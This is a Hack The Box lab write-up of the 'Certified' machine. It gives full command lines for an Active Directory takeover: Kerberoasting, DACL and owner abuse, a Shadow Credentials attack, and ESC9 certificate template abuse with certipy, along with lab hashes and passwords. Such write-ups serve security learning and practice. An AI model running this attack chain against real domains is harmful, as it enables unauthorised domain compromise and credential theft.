---
title: Certified Writeup
description: Writeup of "Certified" machine from Hackthebox
categories: [Writeups, Hackthebox]
tags: [Hackthebox]
image:
  path: /assets/blogimages/Writeups/Hackthebox/Certified/CertifiedLOGO.png
  alt: Certified Writeup
---

## Enumeration

Let's start with an nmap scan:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-04 00:38:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
|_ssl-date: 2025-02-04T00:40:06+00:00; +6h48m17s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
|_ssl-date: 2025-02-04T00:40:06+00:00; +6h48m17s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-04T00:40:06+00:00; +6h48m17s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
50351/tcp open  msrpc         Microsoft Windows RPC
```
The scan reveals key services such as **LDAP, Kerberos, SMB, and WinRM**, indicating an Active Directory environment.

For this box we got given valid creds: judith.mader:judith09
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified1.png)



Logged into LDAP and pulled domain user info using `ldapdomaindump`:
```
ldapdomaindump -u "certified.htb\judith.mader" -p 'judith09' 10.10.11.41
```

Then hosted a simple web server to browse the generated HTML reports:
```
python3 -m http.server 80
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified2.png)

Got users of interest:
```jsx
management_svc
judith.mader
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```

Ran `GetUserSPNs.py` to check for Kerberoastable accounts:
```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  -dc-ip 10.10.11.41 certified.htb/judith.mader -request
```

Got a TGS hash for `management_svc`:
```
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$b2bf3c323d5c27c8ca0bcf495e4e4337$21b9f031a08e9ce218d052c8ce2a815ac9a4ae19aa4dc8e6fe1f92599e1a4f5eef4c669615053c8f7ed88cfb524c3a27bde17108cf3e2c9c60b4e6ecefde8d291cb081725b27998e5641f70d3354fd26483cef8e3731745df18e6353cceb86fe606ecefb1b112e52001a4d27f477472961911b7976c5610524d5012f0a72177a9d4127f96d6f507dcde5ce646ba6e689dac634f67600048643db68273d0e1ee37e7cba50934d5c71db6c159edba406a8e4ab00a6c82f0534bcb6295cede3822ba4200258558aaa63dde58f052fc8894c7f76dd3955d6e9053b8bee67015df26945a30b2499ee72a7a09692f26b616229f422d1ec2a9d1a9fcd4d8dcfba5edf8e8ba5110f63c9614a1a463d91e73dd41aedc87ec6739f332ebff6df91373a1332a75670763ea3e479fdd91fecad316f75aa0c00cc8ea002d67673f4490f79039c8fac9f464b39616a408528c93c7147818d9da0ec2fd5b43a9872adaa759311122f0e725831f586a883843bf877e9abfcb0d204a9c0d6bc1c8eeb8646a170f93ea7e4d21c16815e8416ad7ece5075b12e64aa3fe488c1c165270502ad5c3a9b253a83a0587a71992ed4c9d4b38f72a99de82d68cd783bf27bce682cf0d5bcf1f1776b6c12af04d8e7f2af2739954c1b70b49a8f856e50dd451241395188c703ba3e9d9fdcecd8a40e2d272019da4e9f768cd6610e7daed17000edf76ca93687764d233e8f2710be15c8f1dd26c480e5241f4c89346273144210f2383e3b367eab8987c809f54ec3572dbc3d7126071701747f4badc05f7b9692f249020a652cf1329523635569aa9c409373c2e26a335c4cdb1e2e8c68f71f47c5ca03494556cd42126e911cd0ed399f2c08833fe26151e611e9a11d69055c78b83bd46941a61b49a0f4c9bde304dbb26fb6a5d47b80b4a58dd31afc0f20b8d919f0166250fb7b121c36b65d91173adec69289513b604919fb7be294023ba8c6964e595a05db1d1d9f43bd1340e6469007987007019081a90a64affdb3041fd5f9fead760d0aed19b5c5a93e7cb082fc68d6c91a2e2fe592a478bdf29f57e216334488c40ad307b494e7770e88ebbcd3f91bf289500eb45d0ac84422efd436845770a2aa167083f75eba5756c5711cb03877fc0b281a8313196eab07b708c9d081a02b677903026f04ef995cbc3e623bc43325cdfdfa18f86004f1ab2087e7c9a7056cc3fe816ba16eac6bbce80846ad51d02541cf7259aafe127c460b6806ace4d21e3a31a8ab925dfc15167c446e50cf091cdfbce5bb5d3049fd3b403034821f1f35ce8e4f668ecee050a00cf8e7ec5a4352556f2ea94a203f51b463f7942b4954380fa3b47c8d64775cab2d60cf6b8322e85775c5f7afbe3e16d49aae41e9f0ac02ac92e1a7b575e8d2a957ce4e2651082b19961eb1fc0bbe73bbd2ece57d4a8e12900cd313cdd6b8d21af9a60e6b573ffbdbd0397cd19483979b086f6f7f9b0dd487e9fc499f89d9aac7400b98e8a8cedb385a9caf8f36eb7b5d2c88e6e01449b0b3273973a697eaa938a55ec727fffb93220d2e5359bcae34301a29ac8f99
```

Tried cracking it with hashcat:
```
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
No luck—hash didn’t crack :(

## Initial Foothold

While digging through LDAP, noticed the `msDS-KeyCredentialLink` attribute, which suggested the box might be vulnerable to **Shadow Credentials Attack**.

Confirmed by running:
```
ldapsearch -LLL -H ldap://10.10.11.41 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb"
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified3.png)

This hinted at certificate-based authentication as the way forward. Since the machine is named "Certified," it’s a good bet that **Active Directory Certificate Services (AD CS) exploitation** is in play.


### Identifying Privileges

Using **BloodHound**, mapped object control relationships:
```
bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -c all -dc DC01.certified.htb -ns 10.10.11.41
```

In **Outbound Object Control → First Degree Object Control**, I see that:
- JUDITH.MADER@CERTIFIED.HTB can modify the owner of MANAGEMENT@CERTIFIED.HTB.
- Object owners can change security descriptors, even if they lack permissions on the object's DACL.
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified4.png)

Checking which privileges the **MANAGEMENT** group holds:
- MANAGEMENT@CERTIFIED.HTB members have **GenericWrite** access to MANAGEMENT_SVC@CERTIFIED.HTB.
- **GenericWrite** allows writing to non-protected attributes, including **members** for groups and **servicePrincipalNames** for users.
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified5.png)

Checking what **MANAGEMENT_SVC** controls:
- MANAGEMENT_SVC@CERTIFIED.HTB has **GenericAll** privileges over CA_OPERATOR@CERTIFIED.HTB.
- **GenericAll** grants full control over the target object.
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified6.png)

This means I can gain access to **CA_OPERATOR**.


So I kinda see an attack path:
1. **Modify the owner** of `MANAGEMENT` to `judith.mader`.
2. **Grant WriteMembers** permissions to add `judith.mader` to `MANAGEMENT`.
3. **Leverage GenericWrite** to control `management_svc`.
4. **Use GenericAll** on `ca_operator` to escalate privileges further.
5. Perform certificate attack by using `ca_operator` user.

So let's modify Management group owner & permissions:
```

impacket-owneredit -action write -new-owner 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
net rpc group addmem "Management" judith.mader -U judith.mader@certified.htb -S 10.10.11.41
net rpc group members "Management" -U judith.mader@certified.htb -S 10.10.11.41

```
**Reference:** [Hacking Articles – Abusing AD DACL WriteOwner](https://www.hackingarticles.in/abusing-ad-dacl-writeowner/)



Performed Shadow Credentials Attack:
```
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --action "add" --target "management_svc" --dc-ip 10.10.11.41 --filename management_svc
```
**Reference:** [PentestLab – Shadow Credentials](https://pentestlab.blog/2022/02/07/shadow-credentials/)
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified7.png)


Obtained TGT Using Shadow Credentials:
```
python3 PKINITtools/gettgtpkinit.py -cert-pfx management_svc.pfx -pfx-pass VfmPxNt4jGAPNzFGeJc2 certified.htb/management_svc management_svc.ccache
```

![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified8.png)

```
export KRB5CCNAME=/tmp/pywhisker/pywhisker/management_svc.ccache
python3 PKINITtools/getnthash.py -key de9795c52cd2a6bf9b141ec3a01c56a8963d2d3b0981a438775a650e1fae61af certified.htb/management_svc
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified9.png)

To fix Kerberos Clock Skew Issue:
[Link](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

Alternatively, **[Certipy](https://github.com/ly4k/Certipy?tab=readme-ov-file#installation)** can automate the attack:
```
certipy-ad shadow auto -username judith.mader@certified.htb -p 'judith09' -account management_svc`
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified10.png)


Got management_svc hash:
`a091c1832bcdd4677c28b5a6a1295584`

## Escalating to Administrator

Inside **evil-winrm** as `management_svc`, the password for `ca_operator` was reset:
```
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
net user ca_operator NewPassword123!
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified11.png)



Using `certipy-ad`, certificate templates were enumerated, revealing an **ESC9** vulnerability:
```
certipy-ad find -vulnerable -u ca_operator@certified.htb -p 'NewPassword123!' -dc-ip 10.10.11.41 -stdout
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified12.png)
`ca_operator` can enroll in a vulnerable certificate template.


BloodHound confirmed `CertifiedAuthentication` as a template exploitable for privilege escalation:
```
certipy-ad find -u 'judith.mader' -p 'judith09' -dc-ip 10.10.11.41
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified13.png)
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified14.png)
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified15.png)
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified16.png)
Forked bloodhound was used to view insecure certs: https://github.com/ly4k/BloodHound


These resources were used as references for exploitation:
```
https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760
```


Using `certipy-ad`, `ca_operator` was mapped to `Administrator`:
```
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
certipy-ad req -username ca_operator@certified.htb -p 'NewPassword123!' -ca certified-DC01-CA -template CertifiedAuthentication
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
certipy-ad auth -dc-ip 10.10.11.41 -domain certified.htb -pfx administrator.pfx
```
![](/assets/blogimages/Writeups/Hackthebox/Certified/Certified17.png)

Using `evil-winrm`, access was gained as **Administrator** with the obtained NT hash:
```
evil-winrm -i 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

Administrator privileges were obtained, and the **root flag** was retrieved.